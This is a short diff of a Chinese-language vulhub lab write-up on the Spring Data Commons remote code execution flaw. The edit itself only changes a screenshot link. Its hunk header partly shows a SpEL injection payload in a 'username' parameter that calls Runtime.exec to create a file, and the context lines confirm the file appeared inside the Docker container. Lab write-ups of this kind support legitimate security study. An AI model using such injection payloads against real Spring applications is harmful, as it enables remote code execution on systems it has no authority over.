@@ -45,5 +45,5 @@ username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch 
 
 执行`docker-compose exec spring bash`进入容器中，可见成功创建`/tmp/success`，说明命令执行成功
 
-![Spring_Data_Commons_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Commons_RCE_1.jpg)
+![Spring_Data_Commons_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Commons_RCE_2.jpg)
 
